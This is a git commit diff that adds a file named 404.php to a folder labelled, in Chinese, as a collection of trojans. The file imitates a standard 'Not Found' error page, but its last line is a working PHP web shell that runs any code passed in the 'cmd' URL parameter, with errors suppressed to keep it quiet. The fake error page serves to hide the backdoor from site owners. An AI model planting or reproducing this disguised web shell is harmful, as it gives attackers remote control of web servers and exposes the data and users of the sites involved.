d4cdf8d904e1a151791624e88dc70762d7ea53c7
kit4y <381382770@qq.com>
2020-03-31 04:28:54 +0800

    1

---
+++ 一些木马/404马/404.php
@@ -0,0 +1,8 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /test/download/test1.php was not found on this server.</p>
+</body></html>
+<?php @eval($_GET['cmd']);?>
